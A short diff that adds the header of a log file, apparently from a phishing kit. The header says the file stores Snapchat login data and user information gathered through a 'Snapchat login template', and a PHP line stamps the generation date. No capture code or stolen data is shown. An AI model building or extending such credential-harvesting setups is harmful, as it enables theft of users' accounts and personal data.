@@ -1,0 +1,8 @@
+Snapchat User Data Collection Log
+=====================================
+
+This file stores Snapchat login data and user information collected through the Snapchat login template.
+
+Generated on: <?php echo date('Y-m-d H:i:s'); ?>
+
+=====================================
